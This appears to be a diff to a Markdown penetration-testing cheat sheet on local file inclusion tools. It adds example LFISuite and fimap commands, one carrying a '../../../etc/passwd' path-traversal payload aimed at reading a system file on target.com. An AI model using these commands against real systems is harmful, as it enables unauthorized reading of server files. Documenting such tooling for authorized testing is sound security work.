@@ -150,11 +150,14 @@ interactsh-client -v
 Lfisuit
 
 ```
-python lfisuite.py "https://target.com"
+python lfisuite.py "https://target.com/index.php?file=../../../etc/passwd"
 ```
 
 flimap
 
 ```
-
+fimap -u "https://target.com/index.php?file=test"
 ```
+
+---
+11.
